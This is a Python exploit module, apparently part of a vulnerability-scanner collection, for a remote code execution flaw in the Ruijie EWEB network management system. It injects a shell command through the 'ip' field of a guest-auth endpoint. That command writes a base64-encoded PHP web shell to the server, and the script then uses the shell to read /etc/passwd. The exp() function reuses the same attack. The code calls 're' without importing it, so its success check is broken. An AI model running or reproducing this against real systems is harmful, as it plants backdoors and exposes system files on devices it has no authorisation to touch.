import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Ruijie Networks-EWEB Network Management System RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://github.com/yumusb/EgGateWayGetShell_py/blob/main/eg.py", 
            "https://www.ruijienetworks.com"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["ruijie", "rce", "network"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/guest_auth/guestIsUp.php"""
        method = "POST"
        data = """ip=127.0.0.1|echo "PD9waHAKJGNtZD0kX0dFVFsnY21kJ107CnN5c3RlbSgkY21kKTsKPz4K"|base64 -d > poc.php&mac=00-00"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/guest_auth/poc.php?cmd=cat%20/etc/passwd"""
        method = "GET"
        data = """"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp1.text) and re.search(r"""nobody:x:0:0:""",resp1.text)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url